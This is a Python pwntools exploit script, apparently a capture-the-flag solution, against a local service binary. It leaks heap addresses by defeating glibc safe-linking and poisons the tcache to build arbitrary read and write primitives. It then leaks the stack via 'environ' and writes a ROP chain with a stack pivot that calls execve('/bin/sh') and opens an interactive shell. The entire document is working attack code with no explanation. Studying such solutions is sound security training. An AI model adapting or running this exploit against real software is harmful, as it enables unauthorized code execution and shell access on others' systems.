from pwn import *

#p = process("./main")
p = remote("localhost", 31337)

exe = ELF("./main")

if args.GDB:
    gdb.attach(p)

def mangle(target:int, ptr:int, page_offset=0)->int:
    return target ^ ((ptr >> 12) + page_offset)

def demangle(raw:int, page_offset=0)->int:
    pos = (raw >> 12) + page_offset
    m = pos ^ raw
    return m >> 24 ^ m

payload = b"2 0 1 0 "*(194//2)
payload += b"1 0 "

payload += b"1 2 "
payload += b"2 3 "
payload += b"2 0 "

payload += b"1 1 2 1 "*(94//2)
p.recvuntil(b"> ")
p.sendline(payload)

time.sleep(0.2)
p.clean()

payload = b"4 0 "
p.sendline(payload)
p.recvuntil(b"Which? ")
heap_leak = int(p.recvline())
heap_fd = demangle(heap_leak) - (demangle(heap_leak) & 0xfff) + 0xc70

print(hex(heap_leak))
print(hex(heap_fd))
heap_key = heap_leak ^ heap_fd


TARGET = exe.sym["rng"]
payload += b"3 0 " + str(heap_key ^ TARGET).encode() + b" "
payload += b"1 15 1 15" # 1 15 now rng and zeroed
p.sendline(payload)

# Cannot be first in page.
def read(addr):
    PAGE_BEGIN = addr - (addr & 0xfff)
    payload = b""
    payload += b"1 0 "
    payload += b"1 1 "
    payload += b"2 0 "
    payload += b"2 1 "
    payload += b"3 1 " + str(heap_key ^ PAGE_BEGIN).encode() + b" " # this so it make new
    payload += b"1 0 "
    payload += b"1 1 " # Just allocated 
    
    payload += b"1 0 "
    payload += b"1 1 "
    payload += b"2 0 "
    payload += b"2 1 "
    payload += b"3 1 " + str(heap_key ^ exe.sym["notes"]).encode() + b" " # this so it make new
    payload += b"1 0 "
    payload += b"1 1 "
    payload += b"3 1 " + str(addr).encode() + b" "
    
    p.sendline(payload)
    time.sleep(0.2)
    p.clean()
    p.sendline(b"4 0")
    p.recvuntil(b"Which? ")
    return int(p.recvline())

env = read(exe.sym["environ"])
print(hex(env))


read_note = env - 0x150
print(hex(read_note))

payload = b""
def write(addr, val):
    global payload
    PAGE_BEGIN = addr - (addr & 0xfff)
    payload += b"1 2 "
    payload += b"1 3 "
    payload += b"2 2 "
    payload += b"2 3 "
    payload += b"3 3 " + str(heap_key ^ PAGE_BEGIN).encode() + b" " # this so it make new
    payload += b"1 2 "
    payload += b"1 3 " # Just allocated 

    payload += b"3 1 " + str(addr).encode() + b" "
    payload += b"3 0 " + str(val).encode() + b" "
    

STACK_PIV = 0x00538ef2 # add rsp, 0x60; pop rbx; pop r12; pop rbp; ret;


BASE = read_note - 0x18 + 0x60
write(BASE, 0x00543c1b) # pop rax; ret
write(BASE+8, 0x3b)
write(BASE+16, 0x00592fd4) # pop rdi pop rbp
write(BASE+24, BASE+100)
write(BASE+32, 0)
write(BASE+40, 0x004114de) # pop rsi; ret 8
write(BASE+48, 0)
write(BASE+56, 0x005901c2)


write(BASE+100, u64(b"/bin/sh\x00"))

write(read_note-0x18, STACK_PIV)  # Last one

# 0x00592fd4: pop rdi; pop rbp; ret;
payload += b"1 1"

p.sendline(payload)

p.interactive()
